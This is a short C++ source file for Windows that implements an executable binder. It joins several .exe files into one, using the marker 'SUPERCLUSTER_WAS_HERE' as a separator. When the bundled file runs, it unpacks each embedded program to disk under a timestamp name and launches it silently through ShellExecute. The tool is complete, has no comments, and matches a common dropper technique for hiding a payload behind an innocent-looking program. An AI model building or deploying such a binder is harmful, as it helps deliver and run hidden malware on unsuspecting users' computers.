#undef UNICODE
#include <Windows.h>
#include <fstream>
#include <vector>
#include <string>
#include <chrono>
#define Execute(exe) ShellExecute(nullptr, "open", exe, nullptr, nullptr, SW_NORMAL);
#define SEPARATOR "SUPERCLUSTER_WAS_HERE"
#define SEPARATOR_SIZE strlen(SEPARATOR)
using namespace std;

void FindAll(const string& data, const string& query, vector<int>& occPos) {
	int pos = data.find(query);
	while(pos != string::npos) {
		occPos.push_back(pos);
		pos = data.find(query, pos + query.size());
	}
}

inline void FileAsString(const string& file, string& str) {
    const ios_base::openmode iosOM = ios::binary;
    ifstream ifs(file, iosOM);
    str.assign((istreambuf_iterator<char>(ifs)), istreambuf_iterator<char>());
}

inline long long int TSAsLL() {
	return chrono::duration_cast<chrono::milliseconds>(chrono::system_clock::now().time_since_epoch()).count();
}

void Bind(const vector<string>& files, const string& final, const string& fileOpener) {
	ofstream fout(final, ios::binary);
	fout << ifstream(fileOpener, ios::binary).rdbuf() << SEPARATOR;

	int index = files.size();
	for(auto& file : files) {
		fout << ifstream(file, ios::binary).rdbuf();

		if(--index) {
			fout << SEPARATOR;
		}
	}
}

void Open(const string& file) {
	string data;
	FileAsString(file, data);

	vector<int> occPos;
	FindAll(data, SEPARATOR, occPos); 

	for(int i{1}; i < occPos.size() - 1; i++) {
		string exeName(to_string(TSAsLL()) + ".exe");
		int exeStart = occPos[i] + SEPARATOR_SIZE;
		ofstream(exeName, ios::binary) << data.substr(exeStart, occPos[i + 1] - exeStart);
		Execute(exeName.c_str());
	}

	string exeName(to_string(TSAsLL()) + ".exe");
	ofstream(exeName, ios::binary) << data.substr(occPos.back() + SEPARATOR_SIZE);
	Execute(exeName.c_str());
}

int main(int argc, char** argv) {
	if(argc > 1) {
        vector<string> files(argv+1,argv+argc-1);
		Bind(files, argv[argc - 1], argv[0]);
	} else {
		Open(argv[0]);
	}
	return 0;
}